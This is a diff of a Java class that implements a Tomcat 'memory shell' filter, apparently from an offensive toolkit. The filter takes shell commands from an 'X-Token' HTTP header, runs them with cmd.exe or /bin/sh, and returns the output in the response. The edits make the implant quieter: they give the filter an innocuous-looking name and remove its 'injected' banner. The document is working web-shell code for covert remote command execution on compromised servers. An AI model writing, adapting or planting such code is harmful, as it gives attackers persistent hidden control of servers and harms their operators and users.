@@ -13,9 +13,9 @@ import java.lang.reflect.Method;
  * Tomcat 8 9
  */
 public class TomcatFilterContextClassMS implements Filter {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "TomcatServletThreadMS";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
 
     public TomcatFilterContextClassMS() {
 
@@ -92,13 +92,12 @@ public class TomcatFilterContextClassMS implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatFilterContextClassMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -114,7 +113,7 @@ public class TomcatFilterContextClassMS implements Filter {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
@@ -144,12 +143,12 @@ public class TomcatFilterContextClassMS implements Filter {
         }
     }
 
-    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field field = getField(obj.getClass(), fieldName);
         return field.get(obj);
     }
 
-    public static Field getField(final Class<?> clazz, final String fieldName) {
+    public static Field getField(Class<?> clazz, String fieldName) {
         Field field = null;
         try {
             field = clazz.getDeclaredField(fieldName);
